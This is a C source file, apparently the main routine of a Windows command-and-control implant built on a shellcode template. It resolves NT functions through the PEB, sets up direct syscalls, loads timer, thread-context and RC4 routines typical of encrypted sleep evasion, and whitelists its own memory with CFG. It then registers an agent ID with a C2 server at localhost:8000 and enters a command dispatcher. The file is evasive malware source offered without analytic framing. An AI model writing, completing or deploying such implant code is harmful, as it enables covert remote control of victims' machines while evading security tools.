#include <Common.h>

FUNC VOID Main()
{
    STARDUST_INSTANCE

    if ((Instance()->Modules.Ntdll = LdrModulePeb(H_MODULE_NTDLL)))
    {
        LOAD_FUNCTION(Ntdll, LdrLoadDll)
        LOAD_FUNCTION(Ntdll, RtlAllocateHeap)
        LOAD_FUNCTION(Ntdll, RtlWalkHeap)
        LOAD_FUNCTION(Ntdll, RtlFreeHeap)
        LOAD_FUNCTION(Ntdll, RtlReAllocateHeap)
        LOAD_FUNCTION(Ntdll, RtlCreateTimerQueue)
        LOAD_FUNCTION(Ntdll, RtlCreateTimer)
        LOAD_FUNCTION(Ntdll, RtlCaptureContext)
        LOAD_FUNCTION(Ntdll, RtlLookupFunctionEntry)
        LOAD_FUNCTION(Ntdll, RtlUserThreadStart)
        LOAD_FUNCTION(Ntdll, RtlZeroMemory)
        LOAD_FUNCTION(Ntdll, NtContinue)
        LOAD_FUNCTION(Ntdll, NtSetEvent)
        LOAD_FUNCTION(Ntdll, NtWaitForSingleObject)
        LOAD_FUNCTION(Ntdll, NtProtectVirtualMemory)
        LOAD_FUNCTION(Ntdll, NtSignalAndWaitForSingleObject)
        LOAD_FUNCTION(Ntdll, NtGetContextThread)
        LOAD_FUNCTION(Ntdll, NtSetContextThread)
        LOAD_FUNCTION(Ntdll, NtDuplicateObject)

        SYSCALL_SETUP(NtClose)
        SYSCALL_SETUP(NtCreateEvent)
        SYSCALL_SETUP(NtWaitForSingleObject)
        SYSCALL_SETUP(NtSignalAndWaitForSingleObject)
        SYSCALL_SETUP(NtAllocateVirtualMemory)
        SYSCALL_SETUP(NtProtectVirtualMemory)
        SYSCALL_SETUP(NtSetInformationVirtualMemory)
    }

    // resolve kernel32.dll related functions
    //
    if ((Instance()->Modules.Kernel32 = LdrModulePeb(H_MODULE_KERNEL32)))
    {
        LOAD_FUNCTION(Kernel32, LocalFree)

        LOAD_FUNCTION(Kernel32, VirtualAlloc)
        LOAD_FUNCTION(Kernel32, VirtualFree)
        LOAD_FUNCTION(Kernel32, VirtualProtect)

        LOAD_FUNCTION(Kernel32, FreeLibrary)
        LOAD_FUNCTION(Kernel32, BaseThreadInitThunk)
    }

    if ((Instance()->Modules.WinHTTP = LdrModuleLoad("WinHTTP")))
    {
        LOAD_FUNCTION(WinHTTP, WinHttpCrackUrl)
        LOAD_FUNCTION(WinHTTP, WinHttpOpen)
        LOAD_FUNCTION(WinHTTP, WinHttpConnect)
        LOAD_FUNCTION(WinHTTP, WinHttpOpenRequest)
        LOAD_FUNCTION(WinHTTP, WinHttpSendRequest)
        LOAD_FUNCTION(WinHTTP, WinHttpReceiveResponse)
        LOAD_FUNCTION(WinHTTP, WinHttpQueryDataAvailable)
        LOAD_FUNCTION(WinHTTP, WinHttpReadData)
        LOAD_FUNCTION(WinHTTP, WinHttpCloseHandle)
    }

    if ((Instance()->Modules.Msvcrt = LdrModuleLoad(("Msvcrt"))))
    {
        LOAD_FUNCTION(Msvcrt, vsnprintf)
        LOAD_FUNCTION(Msvcrt, vprintf)
        LOAD_FUNCTION(Msvcrt, sprintf)
        LOAD_FUNCTION(Msvcrt, printf)
        LOAD_FUNCTION(Msvcrt, memmove)
    }

    if ((Instance()->Modules.Cryptsp = LdrModuleLoad("Cryptsp")))
    {
        LOAD_FUNCTION(Cryptsp, SystemFunction032)
    }

    Instance()->Heap = Instance()->Peb->ProcessHeap;

    CfgPrivateAddressAdd(NtCurrentProcess(), Instance()->Base.Buffer, Instance()->Base.Length);

    BUFFER AgentId = SendRequest(L"http://localhost:8000/register", L"GET", NULL);
    Instance()->AgentID = &AgentId;

    CommandDispatcher();
}
